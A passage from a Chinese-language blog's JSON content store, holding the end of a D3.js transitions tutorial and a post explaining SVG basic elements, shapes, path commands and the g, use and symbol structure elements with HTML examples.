class=\"number\">20</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">2000</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">400</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;#00f&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"选择性过渡\"><a href=\"#选择性过渡\" class=\"headerlink\" title=\"选择性过渡\"></a>选择性过渡</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> data = [<span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;rect&#x27;</span>)</span><br><span class=\"line\">    .data(data)</span><br><span class=\"line\">    .enter()</span><br><span class=\"line\">.append(<span class=\"string\">&#x27;text&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;text-item&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> (i + <span class=\"number\">1</span>) * <span class=\"number\">40</span>)</span><br><span class=\"line\">    .text(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;bounce&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">500</span>)</span><br><span class=\"line\">.filter(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> data === <span class=\"string\">&#x27;Cat&#x27;</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">600</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">20</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"监听过渡事件\"><a href=\"#监听过渡事件\" class=\"headerlink\" title=\"监听过渡事件\"></a>监听过渡事件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> data = [<span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;rect&#x27;</span>)</span><br><span class=\"line\">    .data(data)</span><br><span class=\"line\">    .enter()</span><br><span class=\"line\">.append(<span class=\"string\">&#x27;text&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;text-item&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> (i + <span class=\"number\">1</span>) * <span class=\"number\">40</span>)</span><br><span class=\"line\">    .text(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;bounce&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">500</span>)</span><br><span class=\"line\">.filter(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> data === <span class=\"string\">&#x27;Cat&#x27;</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">600</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span><br><span class=\"line\">    .each(<span class=\"string\">&#x27;start&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123; <span class=\"comment\">// 动画开始</span></span><br><span class=\"line\">        d3.select(<span class=\"built_in\">this</span>).text(data.toUpperCase());</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .each(<span class=\"string\">&#x27;end&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 动画结束</span></span><br><span class=\"line\">        d3.select(<span class=\"built_in\">this</span>).text(<span class=\"string\">&#x27;end&#x27;</span>);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .each(<span class=\"string\">&#x27;interrupt&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 动画被打断</span></span><br><span class=\"line\">        d3.select(<span class=\"built_in\">this</span>).text(<span class=\"string\">&#x27;interrupt&#x27;</span>);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">20</span>);</span><br></pre></td></tr></table></figure>"},{"title":"SVG 基础元素","date":"2021-03-23T16:00:00.000Z","_content":"\n# SVG 基础元素\n\n## SVG 元素通用属性\n* transform 对基础图形进行变换处理（与 CSS3 中的 transform 属性有点不一致）\n    * 平移 `translate(50,30)` \n    * 缩放 `scale(2)` \n    * 旋转 `rotate(30)` \n    * 翻转 `skewX()`、`skewY(10)`\n* fill：填充色\n* stroke：定义图形、文本等的边线颜色\n\n说明：支持 hover 伪类、id、class 等\n\n## SVG 元素通用 CSS 样式\n* display: 控制元素是否可见（`inline`、`none`，所有元素的初始值都为 `inline`）\n* fill:  填充色\n* fill-opacity: 填充色透明度\n* stroke: 定义图形、文本等的边线颜色\n* stroke-width: 定义图形、文字边线的宽度 \n* stroke-opacity: 定义图形、文字边线的透明度\n* stroke-linecap：用来定义开放式路径的端点的样式（`butt`、`round`、`square`）\n* stroke-linejoin：用来控制两个线段之间的联合是如何绘制\n* stroke-dasharray：用来创建虚线（如 `stroke-dasharray=\"5,5\"`）\n* fill-rule：判断路径的哪一侧在路径所构成的形状的内部，从而判断fill属性如何给这个形状上色\n\n![stroke-linecap 属性](https://mdn.mozillademos.org/files/730/SVG_Stroke_Linecap_Example.png)\n![stroke-linejoin 属性](https://mdn.mozillademos.org/files/731/SVG_Stroke_Linejoin_Example.png)\n\n## 文本\n### SVG 文本 （`<text>`）\n说明：用来定义文字文本，例如 `<text>测试文字</text>`\n\n支持的样式：`font-family`，`font-style`，`font-weight`，`font-variant`，`font-stretch`，`font-size`，`font-size-adjust`，`kerning`，`letter-spacing`，`word-spacing` 和 `text-decoration`\n\n### 内联文本  （`<tspan>`）\n说明：嵌套在 `<text>` 标签中，与 `<span>` 标签类似，用于定义一组文本的样式\n\n### 文本路径  （`<textPath>`）\n说明：嵌套在 `<text>` 标签中，使文字按照指定路径排列，放在 `<text>` 标记内部引用预定义的 `<path>`，引用时，使用 `xlink:href` 属性指明需要引用的路径的 ID\n\n### 链接 （`<a>`）\n说明：创建一个 SVG 元素链接\n\n* xlink:show\n* xlink:actuate\n* xlink:href\n* target\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n<body>\n    <svg width=\"800\" height=\"400\" style=\"border: 1px solid #aaa;\">\n        <defs>\n            <path id=\"MyPath\" d=\"M 100 200 \n                     C 200 100 300   0 400 100\n                     C 500 200 600 300 700 200\n                     C 800 100 900 100 900 100\" />\n        </defs>\n        <a xlink:href=\"https://www.baidu.com\" target=\"_blank\">\n            <text x=\"100\" y=\"15\" style=\"fill: #009; cursor: pointer;\"> 打开百度</text>\n        </a>\n        <text x=\"0\" y=\"15\" style=\"fill: red;\" transform=\"rotate(30 20, 30)\">\n             Just test SVG! <tspan style=\"fill: #0f0; font-size: 26px; font-style: italic;\">中国人民银行</tspan> nothing nothing nothing\n        </text>\n        <text>\n            <textPath xlink:href=\"#MyPath\">\n                SVG 基本功能测试基本功能测试基本功能测试基本功能测试基本功能测试\n            </textPath>\n        </text>\n    </svg>\n</body>\n</html>\n```\n\n\n## 基本图形\n\n### 矩形（`<rect>`）\n* x: 元素距离左边的距离\n* y: 元素距离上边的距离\n* width: 元素的宽度\n* height: 元素的高度\n* rx: 矩形 X 轴方向的半径\n* rx: 矩形 Y 轴方向的半径\n\n### 圆形 （`<circle>`）\n* cx: 圆心距离 Y 轴的距离\n* cy: 圆心距离 X 轴的距离\n* r: 圆的半径\n\n### 椭圆（`<ellipse>`）\n* cx: 圆心距离 Y 轴的距离\n* cy: 圆心距离 X 轴的距离\n* rx: 圆的 X 轴的半径\n* ry: 圆的 Y 轴的半径\n\n### 直线（`<line>`）\n* x1: X 轴方向的起点\n* y1: Y 轴方向的起点\n* x2: X 轴方向的终点\n* y2: Y 轴方向的终点\n\n### 折线 （`<polyline>`）\n* points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割\n    * 例如 `<polyline points=\"3,3 10,40 50,100 20,150\"/>`\n\n### 多边形 （`<polygen>`）\n* points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割，并组成闭合的环形\n\n### 路径 （`<path>`）\n* d 用于定义一系列指令，例如 `<path d=\"M150 0 L75 200 L225 200 Z\" />`\n\n|指令\t| 参数 | 名称 | 描述 |\n| --- | --- | --- | --- |\n|M\t|x,y\t|moveto |移动到\t移动虚拟画笔到指定的（x,y）坐标，仅移动不绘制|\n|m\t|x,y\t|moveto\t|同M，但使用相对坐标|\n|L\t|x,y\t|lineto |连直线到\t从当前画笔所在位置绘制一条直线到指定的（x,y）坐标|\n|l\t|x,y\t|lineto\t|同L，但使用相对坐标|\n|H\t|x\t|horizontal lineto |水平连线到\t绘制一条水平直线到参数指定的x坐标点，y坐标为画笔的y坐标|\n|h\t|x\t|horizontal lineto\t|同H，但使用相对坐标|\n|V\t|y\t|vertical lineto |垂直连线到\t从当前位置绘制一条垂直直线到参数指定的y坐标|\n|v\t|y\t|vertical lineto\t|同V，但使用相对坐标|\n|C\t|x1,y1 x2,y2 x,y\t|curveto 三次方贝塞尔曲线\t|从当前画笔位置绘制一条三次贝兹曲线到参数（x,y）指定的坐标。x1，y1和x2,y2是曲线的开始和结束控制点，用于控制曲线的弧度|\n|c\t|x1,y1 x2,y2 x,y\t|curveto\t|同C，但使用相对坐标|\n|S\t|x2,y2 x,y\t|shorthand |平滑三次方贝塞尔曲线\t从当前画笔位置绘制一条三次贝塞尔曲线到参数（x,y）指定的坐标。x2,y2是结束控制点。开始控制点和前一条曲线的结束控制点相同|\n|s\t|x2,y2 x,y\t|shorthand |平滑三次方贝塞尔曲线\t同S，但使用相对坐标|\n|Q\t|x1,y1 x,y\t|二次方贝塞尔曲线\t|从当前画笔位置绘制一条二次方贝塞尔曲线到参数（x,y）指定的坐标。x1,y1是控制点，用于控制曲线的弧度|\n|q\t|x1,y1 x,y\t|二次方贝塞尔曲线\t|同Q，但使用相对坐标|\n|T\t|x,y\t|平滑的二次贝塞尔曲线\t|从当前画笔位置绘制一条二次贝塞尔曲线到参数（x,y）指定的坐标。控制点被假定为最后一次使用的控制点|\n|t\t|x,y\t|平滑的二次贝塞尔曲线\t|同T，但使用相对坐标|\n|A\t|rx,ry x-axis-rotation large-arc-flag,sweepflag x,y\t|椭圆弧线\t|从当前画笔位置开始绘制一条椭圆弧线到（x,y）指定的坐标。rx和ry分别为椭圆弧线水平和垂直方向上的半径。x-axis-rotation指定弧线绕x轴旋转的度数。它只在rx和ry的值不相同是有效果。large-arc-flag是大弧标志位，取值0或1，用于决定绘制大弧还是小弧。sweep-flag用于决定弧线绘制的方向|\n|a\t|rx,ry x-axis-rotation large-arc-flag,sweepflag x,y\t|椭圆弧线\t|同A，但使用相对坐标|\n|Z\t|无\t|闭合路径\t|从结束点绘制一条直线到开始点，闭合路径|\n|z\t|无\t|闭合路径\t|同Z|\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n<body>\n    <svg width=\"400\" height=\"400\" style=\"border: 1px solid #999;\">\n        <rect x=\"20\" y=\"40\" width=\"200\" height=\"200\" rx=\"20\" ry=\"30\" style=\"fill: #009;stroke: #f00; stroke-width: 2; fill-opacity: 0.5; stroke-opacity: 5.2\"/>\n        <circle cx=\"290\" cy=\"60\" r=\"40\" style=\"fill: #0f0; fill-opacity: .4;\"/>\n        <ellipse cx=\"300\" cy=\"150\" rx=\"60\" ry=\"40\" style=\"fill: #900; stroke: #999; stroke-width: 3; stroke-opacity: .5;\"/>\n        <line x1=\"240\" y1=\"220\" x2=\"395\" y2=\"220\" style=\"stroke: #333; stroke-width: 2;\"/>\n        <polyline points=\"3,3 10,40 50,100 20,150 20,180 50,180 50,210 80,210 110,210\" style=\"fill:none; stroke:#099; stroke-width: 1\"/>\n        <polygon points=\"110, 20 30, 40 80, 50\" style=\"fill: #934;\"/>\n        <polygon points=\"100,10 40,198 190,78 10,78 160,198\" style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\" />\n        <path d=\"M 175 200 l 150 0\" stroke=\"green\" stroke-width=\"3\" fill=\"none\" />\n        <path d=\"M 100 350 q 150 -300 300 0\" stroke=\"blue\" stroke-width=\"5\" fill=\"none\" />\n    </svg>\n</body>\n</html>\n```\n\n## 结构元素\n### 分组 （`<g>`）\n说明：`<g>` 用于分组，它能把多个元素放在一组里，对 `<g>` 标记的样式和渲染会作用到这个分组内的所有元素上。组内的所有元素都会继承 `<g>` 标记上的所有属性。用 `<g>` 定义的分组还可以使用 `<use>` 进行复制使用。\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n<body>\n    <svg width=\"400\" height=\"300\" style=\"border: 1px solid #999;\">\n        <g style=\"fill: red; stroke: #090; stroke-width: 2;\">\n            <circle r=\"40\" cx=\"180\" cy=\"140\"></circle>\n            <rect x=\"30\" y=\"40\" width=\"100\" height=\"50\"></rect>\n            <rect x=\"230\" y=\"40\" width=\"100\" height=\"50\"></rect>\n        </g>\n    </svg>\n</body>\n</html>\n```\n\n### 复制 （`<use>`）\n说明：`<use>` 能从 SVG 文档内部取出一个节点，克隆它，并把它输出到别处。子元素能继承来自 `<use>` 样式\n\n```html\n<html lang=\"en\">\n\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n\n<body>\n    <svg width=\"400\" height=\"300\" style=\"border: 1px solid #999;\">\n        <defs>\n            <g id=\"shape\" style=\"fill: inherit; stroke: #090; stroke-width: 2;\">\n                <circle r=\"40\" cx=\"180\" cy=\"140\"></circle>\n                <rect x=\"30\" y=\"40\" width=\"100\" height=\"50\"></rect>\n                <rect x=\"230\" y=\"40\" width=\"100\" height=\"50\"></rect>\n            </g>\n        </defs>\n\n        <text y=\"15\">图形1</text>\n        <use x=\"20\" y=\"20\" xlink:href=\"#shape\" style=\"fill: #009;\"></use>\n    </svg>\n</body>\n\n</html>\n```\n\n### 模板（<symbol>）\n`<symbol>` 的作用是定义一个图像模板，使用 `<use>` 标记实例化它，然后在 SVG 文档中反复使用。`<symbol>` 本身不会输出任何图像，只有使用 `<use>` 实例化后才会显示。\n\n```html\n<html lang=\"en\">\n\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n\n<body>\n    <svg width=\"400\" height=\"300\" style=\"border: 1px solid #999;\">\n        <!-- symbol definition  NEVER draw -->\n        <symbol id=\"sym01\" viewBox=\"0 0 150 110\">\n            <circle cx=\"50\" cy=\"50\" r=\"40\" stroke-width=\"8\" stroke=\"red\" fill=\"red\" />\n            <circle cx=\"90\" cy=\"60\" r=\"40\" stroke-width=\"8\" stroke=\"green\" fill=\"white\" />\n        </symbol>\n    \n        <!-- actual drawing by \"use\" element -->\n        <use xlink:href=\"#sym01\" x=\"0\" y=\"0\" width=\"100\" height=\"50\" />\n        <use xlink:href=\"#sym01\" x=\"0\" y=\"50\" width=\"75\" height=\"38\" />\n        <use xlink:href=\"#sym01\" x=\"0\" y=\"100\" width=\"50\" height=\"25\" />\n    </svg>\n</body>\n\n</html>\n```","source":"_posts/SVG/SVG 基础元素.md","raw":"---\ntitle: SVG 基础元素\ncategories: SVG\ntags: [SVG]\ndate: 2021-03-24\n---\n\n# SVG 基础元素\n\n## SVG 元素通用属性\n* transform 对基础图形进行变换处理（与 CSS3 中的 transform 属性有点不一致）\n    * 平移 `translate(50,30)` \n    * 缩放 `scale(2)` \n    * 旋转 `rotate(30)` \n    * 翻转 `skewX()`、`skewY(10)`\n* fill：填充色\n* stroke：定义图形、文本等的边线颜色\n\n说明：支持 hover 伪类、id、class 等\n\n## SVG 元素通用 CSS 样式\n* display: 控制元素是否可见（`inline`、`none`，所有元素的初始值都为 `inline`）\n* fill:  填充色\n* fill-opacity: 填充色透明度\n* stroke: 定义图形、文本等的边线颜色\n* stroke-width: 定义图形、文字边线的宽度 \n* stroke-opacity: 定义图形、文字边线的透明度\n* stroke-linecap：用来定义开放式路径的端点的样式（`butt`、`round`、`square`）\n* stroke-linejoin：用来控制两个线段之间的联合是如何绘制\n* stroke-dasharray：用来创建虚线（如 `stroke-dasharray=\"5,5\"`）\n* fill-rule：判断路径的哪一侧在路径所构成的形状的内部，从而判断fill属性如何给这个形状上色\n\n![stroke-linecap 属性](https://mdn.mozillademos.org/files/730/SVG_Stroke_Linecap_Example.png)\n![stroke-linejoin 属性](https://mdn.mozillademos.org/files/731/SVG_Stroke_Linejoin_Example.png)\n\n## 文本\n### SVG 文本 （`<text>`）\n说明：用来定义文字文本，例如 `<text>测试文字</text>`\n\n支持的样式：`font-family`，`font-style`，`font-weight`，`font-variant`，`font-stretch`，`font-size`，`font-size-adjust`，`kerning`，`letter-spacing`，`word-spacing` 和 `text-decoration`\n\n### 内联文本  （`<tspan>`）\n说明：嵌套在 `<text>` 标签中，与 `<span>` 标签类似，用于定义一组文本的样式\n\n### 文本路径  （`<textPath>`）\n说明：嵌套在 `<text>` 标签中，使文字按照指定路径排列，放在 `<text>` 标记内部引用预定义的 `<path>`，引用时，使用 `xlink:href` 属性指明需要引用的路径的 ID\n\n### 链接 （`<a>`）\n说明：创建一个 SVG 元素链接\n\n* xlink:show\n* xlink:actuate\n* xlink:href\n* target\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n<body>\n    <svg width=\"800\" height=\"400\" style=\"border: 1px solid #aaa;\">\n        <defs>\n            <path id=\"MyPath\" d=\"M 100 200 \n                     C 200 100 300   0 400 100\n                     C 500 200 600 300 700 200\n                     C 800 100 900 100 900 100\" />\n        </defs>\n        <a xlink:href=\"https://www.baidu.com\" target=\"_blank\">\n            <text x=\"100\" y=\"15\" style=\"fill: #009; cursor: pointer;\"> 打开百度</text>\n        </a>\n        <text x=\"0\" y=\"15\" style=\"fill: red;\" transform=\"rotate(30 20, 30)\">\n             Just test SVG! <tspan style=\"fill: #0f0; font-size: 26px; font-style: italic;\">中国人民银行</tspan> nothing nothing nothing\n        </text>\n        <text>\n            <textPath xlink:href=\"#MyPath\">\n                SVG 基本功能测试基本功能测试基本功能测试基本功能测试基本功能测试\n            </textPath>\n        </text>\n    </svg>\n</body>\n</html>\n```\n\n\n## 基本图形\n\n### 矩形（`<rect>`）\n* x: 元素距离左边的距离\n* y: 元素距离上边的距离\n* width: 元素的宽度\n* height: 元素的高度\n* rx: 矩形 X 轴方向的半径\n* rx: 矩形 Y 轴方向的半径\n\n### 圆形 （`<circle>`）\n* cx: 圆心距离 Y 轴的距离\n* cy: 圆心距离 X 轴的距离\n* r: 圆的半径\n\n### 椭圆（`<ellipse>`）\n* cx: 圆心距离 Y 轴的距离\n* cy: 圆心距离 X 轴的距离\n* rx: 圆的 X 轴的半径\n* ry: 圆的 Y 轴的半径\n\n### 直线（`<line>`）\n* x1: X 轴方向的起点\n* y1: Y 轴方向的起点\n* x2: X 轴方向的终点\n* y2: Y 轴方向的终点\n\n### 折线 （`<polyline>`）\n* points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割\n    * 例如 `<polyline points=\"3,3 10,40 50,100 20,150\"/>`\n\n### 多边形 （`<polygen>`）\n* points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割，并组成闭合的环形\n\n### 路径 （`<path>`）\n* d 用于定义一系列指令，例如 `<path d=\"M150 0 L75 200 L225 200 Z\" />`\n\n|指令\t| 参数 | 名称 | 描述 |\n| --- | --- | --- | --- |\n|M\t|x,y\t|moveto |移动到\t移动虚拟画笔到指定的（x,y）坐标，仅移动不绘制|\n|m\t|x,y\t|moveto\t|同M，但使用相对坐标|\n|L\t|x,y\t|lineto |连直线到\t从当前画笔所在位置绘制一条直线到指定的（x,y）坐标|\n|l\t|x,y\t|lineto\t|同L，但使用相对坐标|\n|H\t|x\t|horizontal lineto |水平连线到\t绘制一条水平直线到参数指定的x坐标点，y坐标为画笔的y坐标|\n|h\t|x\t|horizontal lineto\t|同H，但使用相对坐标|\n|V\t|y\t|vertical lineto |垂直连线到\t从当前位置绘制一条垂直直线到参数指定的y坐标|\n|v\t|y\t|vertical lineto\t|同V，但使用相对坐标|\n|C\t|x1,y1 x2,y2 x,y\t|curveto 三次方贝塞尔曲线\t|从当前画笔位置绘制一条三次贝兹曲线到参数（x,y）指定的坐标。x1，y1和x2,y2是曲线的开始和结束控制点，用于控制曲线的弧度|\n|c\t|x1,y1 x2,y2 x,y\t|curveto\t|同C，但使用相对坐标|\n|S\t|x2,y2 x,y\t|shorthand |平滑三次方贝塞尔曲线\t从当前画笔位置绘制一条三次贝塞尔曲线到参数（x,y）指定的坐标。x2,y2是结束控制点。开始控制点和前一条曲线的结束控制点相同|\n|s\t|x2,y2 x,y\t|shorthand |平滑三次方贝塞尔曲线\t同S，但使用相对坐标|\n|Q\t|x1,y1 x,y\t|二次方贝塞尔曲线\t|从当前画笔位置绘制一条二次方贝塞尔曲线到参数（x,y）指定的坐标。x1,y1是控制点，用于控制曲线的弧度|\n|q\t|x1,y1 x,y\t|二次方贝塞尔曲线\t|同Q，但使用相对坐标|\n|T\t|x,y\t|平滑的二次贝塞尔曲线\t|从当前画笔位置绘制一条二次贝塞尔曲线到参数（x,y）指定的坐标。控制点被假定为最后一次使用的控制点|\n|t\t|x,y\t|平滑的二次贝塞尔曲线\t|同T，但使用相对坐标|\n|A\t|rx,ry x-axis-rotation large-arc-flag,sweepflag x,y\t|椭圆弧线\t|从当前画笔位置开始绘制一条椭圆弧线到（x,y）指定的坐标。rx和ry分别为椭圆弧线水平和垂直方向上的半径。x-axis-rotation指定弧线绕x轴旋转的度数。它只在rx和ry的值不相同是有效果。large-arc-flag是大弧标志位，取值0或1，用于决定绘制大弧还是小弧。sweep-flag用于决定弧线绘制的方向|\n|a\t|rx,ry x-axis-rotation large-arc-flag,sweepflag x,y\t|椭圆弧线\t|同A，但使用相对坐标|\n|Z\t|无\t|闭合路径\t|从结束点绘制一条直线到开始点，闭合路径|\n|z\t|无\t|闭合路径\t|同Z|\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n<body>\n    <svg width=\"400\" height=\"400\" style=\"border: 1px solid #999;\">\n        <rect x=\"20\" y=\"40\" width=\"200\" height=\"200\" rx=\"20\" ry=\"30\" style=\"fill: #009;stroke: #f00; stroke-width: 2; fill-opacity: 0.5; stroke-opacity: 5.2\"/>\n        <circle cx=\"290\" cy=\"60\" r=\"40\" style=\"fill: #0f0; fill-opacity: .4;\"/>\n        <ellipse cx=\"300\" cy=\"150\" rx=\"60\" ry=\"40\" style=\"fill: #900; stroke: #999; stroke-width: 3; stroke-opacity: .5;\"/>\n        <line x1=\"240\" y1=\"220\" x2=\"395\" y2=\"220\" style=\"stroke: #333; stroke-width: 2;\"/>\n        <polyline points=\"3,3 10,40 50,100 20,150 20,180 50,180 50,210 80,210 110,210\" style=\"fill:none; stroke:#099; stroke-width: 1\"/>\n        <polygon points=\"110, 20 30, 40 80, 50\" style=\"fill: #934;\"/>\n        <polygon points=\"100,10 40,198 190,78 10,78 160,198\" style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\" />\n        <path d=\"M 175 200 l 150 0\" stroke=\"green\" stroke-width=\"3\" fill=\"none\" />\n        <path d=\"M 100 350 q 150 -300 300 0\" stroke=\"blue\" stroke-width=\"5\" fill=\"none\" />\n    </svg>\n</body>\n</html>\n```\n\n## 结构元素\n### 分组 （`<g>`）\n说明：`<g>` 用于分组，它能把多个元素放在一组里，对 `<g>` 标记的样式和渲染会作用到这个分组内的所有元素上。组内的所有元素都会继承 `<g>` 标记上的所有属性。用 `<g>` 定义的分组还可以使用 `<use>` 进行复制使用。\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n<body>\n    <svg width=\"400\" height=\"300\" style=\"border: 1px solid #999;\">\n        <g style=\"fill: red; stroke: #090; stroke-width: 2;\">\n            <circle r=\"40\" cx=\"180\" cy=\"140\"></circle>\n            <rect x=\"30\" y=\"40\" width=\"100\" height=\"50\"></rect>\n            <rect x=\"230\" y=\"40\" width=\"100\" height=\"50\"></rect>\n        </g>\n    </svg>\n</body>\n</html>\n```\n\n### 复制 （`<use>`）\n说明：`<use>` 能从 SVG 文档内部取出一个节点，克隆它，并把它输出到别处。子元素能继承来自 `<use>` 样式\n\n```html\n<html lang=\"en\">\n\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            